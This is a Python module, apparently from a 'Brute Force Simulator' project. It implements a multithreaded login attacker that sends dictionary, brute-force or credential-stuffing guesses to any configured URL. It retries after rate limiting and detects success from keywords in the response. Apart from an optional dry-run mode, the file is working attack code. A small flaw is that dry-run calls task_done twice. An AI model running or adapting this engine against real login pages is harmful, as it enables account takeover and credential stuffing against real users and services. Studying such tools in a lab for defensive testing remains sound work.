"""
Attack Engine
--------------
Manages the password queue, spawns worker threads,
sends HTTP POST requests to the target, and handles responses.
"""

import time
import threading
import requests
from queue import Queue, Empty

from src.engine.config   import Config
from src.engine.reporter import Reporter
from src.engine.wordlist import WordlistLoader, BruteForceGen, StuffingLoader


class BruteForceAttacker:
    def __init__(self, config: Config, reporter: Reporter = None):
        self.config   = config
        self.reporter = reporter or Reporter()
        self.queue    = Queue()
        self.found    = threading.Event()
        self._lock    = threading.Lock()

    # ── Queue Population ───────────────────────────────────────────────────────

    def _populate_queue(self):
        mode = self.config.mode

        if mode == "dictionary":
            loader = WordlistLoader(self.config.wordlist)
            for password in loader.load():
                self.queue.put((self.config.username, password))

        elif mode == "bruteforce":
            gen = BruteForceGen(
                charset=self.config.charset,
                max_length=self.config.max_length,
            )
            for password in gen.generate():
                self.queue.put((self.config.username, password))

        elif mode == "stuffing":
            loader = StuffingLoader(self.config.wordlist)
            for username, password in loader.load():
                self.queue.put((username, password))

    # ── Worker Thread ─────────────────────────────────────────────────────────

    def _worker(self):
        session = requests.Session()

        while not self.found.is_set():
            try:
                username, password = self.queue.get(timeout=1)
            except Empty:
                break

            try:
                if self.config.dry_run:
                    print(f"[DRY-RUN] Would try → {username}:{password}")
                    self.reporter.log_attempt()
                    self.queue.task_done()
                    continue

                resp = session.post(
                    self.config.target,
                    data={"username": username, "password": password},
                    timeout=self.config.timeout,
                    allow_redirects=True,
                )

                self.reporter.log_attempt()

                # ── Response Analysis ────────────────────────────────────────
                if resp.status_code == 429:
                    self.reporter.log_rate_limited()
                    print(f"[!] Rate limited — sleeping 5s")
                    time.sleep(5)
                    self.queue.put((username, password))  # Re-queue attempt

                elif self._is_success(resp):
                    self.reporter.log_success(username, password)
                    self.found.set()

                else:
                    self.reporter.log_failure()
                    print(f"[-] {username}:{password}  →  FAIL  "
                          f"(attempt #{self.reporter.attempts})", end="\r")

                if self.config.delay > 0:
                    time.sleep(self.config.delay)

            except requests.exceptions.ConnectionError:
                print(f"\n[!] Connection refused. Is the target server running?")
                self.found.set()
                break
            except requests.exceptions.Timeout:
                print(f"\n[!] Request timed out for {username}:{password}")
                self.reporter.log_failure()
            except Exception as e:
                print(f"\n[!] Unexpected error: {e}")
            finally:
                self.queue.task_done()

    # ── Success Detection ─────────────────────────────────────────────────────

    def _is_success(self, resp: requests.Response) -> bool:
        success_indicators = ["welcome", "dashboard", "logout", "success", "logged in"]
        failure_indicators = ["invalid", "incorrect", "wrong", "failed", "error", "unauthorized"]

        body = resp.text.lower()

        if resp.status_code in (200, 302):
            for word in failure_indicators:
                if word in body:
                    return False
            for word in success_indicators:
                if word in body:
                    return True
            # Status 200 with no failure keyword = likely success
            if resp.status_code == 200 and len(body) > 0:
                return True

        return False

    # ── Run ───────────────────────────────────────────────────────────────────

    def run(self):
        print(f"\n{'='*50}")
        print(f"  Brute Force Simulator")
        print(f"{'='*50}")
        print(f"  Target   : {self.config.target}")
        print(f"  Mode     : {self.config.mode}")
        print(f"  Username : {self.config.username}")
        print(f"  Threads  : {self.config.threads}")
        print(f"  Delay    : {self.config.delay}s")
        print(f"  Dry Run  : {self.config.dry_run}")
        print(f"{'='*50}\n")

        print("[*] Populating password queue...")
        self._populate_queue()
        total = self.queue.qsize()
        print(f"[*] {total} passwords loaded. Starting attack...\n")

        threads = [
            threading.Thread(target=self._worker, daemon=True)
            for _ in range(self.config.threads)
        ]
        for t in threads:
            t.start()

        self.queue.join()

        for t in threads:
            t.join(timeout=2)

        self.reporter.save()
